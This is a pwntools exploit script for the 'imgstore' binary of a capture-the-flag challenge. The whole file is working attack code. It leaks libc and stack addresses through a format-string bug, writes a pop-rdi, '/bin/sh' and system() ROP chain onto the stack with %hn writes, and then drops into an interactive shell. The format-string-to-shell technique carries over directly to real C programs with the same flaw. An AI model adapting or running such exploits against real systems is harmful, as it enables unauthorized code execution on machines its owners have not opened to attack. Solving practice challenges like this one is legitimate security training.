#!/usr/bin/python3

from pwn import *

exe = ELF('imgstore_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)
def sln(msg, num): return sla(msg, str(num).encode())
def sn(msg, num): return sa(msg, str(num).encode())


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        brva 0x1ED2

        c
        ''')
        input()


if args.REMOTE:
    p = remote('imgstore.chal.imaginaryctf.org', 1337)
else:
    p = process(exe.path)


def se(pa):
    sla(b"title: ", pa)
    p.recvuntil(b'--> ')


sla(b">>", b'3')
se("%25$p|%22$p|")
libc.address = int(p.recvuntil(b"|", drop=True), 16) - 0x24083
stack = int(p.recvuntil(b"|", drop=True), 16) - 0x28
info("libc.address: " + hex(libc.address))
info("stack: " + hex(stack))
sla(b"[y/n]: ", b"y")
pop_rdi = libc.address + 0x00000000000248f2

# package = {
#     (pop_rdi+1) & 0xffff: stack,
#     (pop_rdi+1) >> 16 & 0xffff: stack+2,
#     (pop_rdi+1) >> 32 & 0xffff: stack+4,
# }
# order = sorted(package)
# for i in range(3):
#     pa = f"%{order[i]}c%10$hn".encode().ljust(16)
#     pa += flat(
#         package[order[i]]
#     )
#     se(pa)
#     sla(b"[y/n]: ", b"y")
# stack += 8

package = {
    (pop_rdi) & 0xffff: stack,
    (pop_rdi) >> 16 & 0xffff: stack+2,
    (pop_rdi) >> 32 & 0xffff: stack+4,
}
order = sorted(package)
for i in range(3):
    pa = f"%{order[i]}c%10$hn".encode().ljust(16)
    pa += flat(
        package[order[i]]
    )
    se(pa)
    sla(b"[y/n]: ", b"y")

stack += 8
package = {
    next(libc.search(b'/bin/sh')) & 0xffff: stack,
    next(libc.search(b'/bin/sh')) >> 16 & 0xffff: stack+2,
    next(libc.search(b'/bin/sh')) >> 32 & 0xffff: stack+4,
}
order = sorted(package)
for i in range(3):
    pa = f"%{order[i]}c%10$hn".encode().ljust(16)
    pa += flat(
        package[order[i]]
    )
    se(pa)
    sla(b"[y/n]: ", b"y")
GDB()

stack += 8
stack += 8
package = {
    libc.sym.system & 0xffff: stack,
    libc.sym.system >> 16 & 0xffff: stack+2,
    libc.sym.system >> 32 & 0xffff: stack+4,
}
order = sorted(package)
for i in range(3):
    pa = f"%{order[i]}c%10$hn".encode().ljust(16)
    pa += flat(
        package[order[i]]
    )
    se(pa)
    sla(b"[y/n]: ", b"y")
p.interactive()
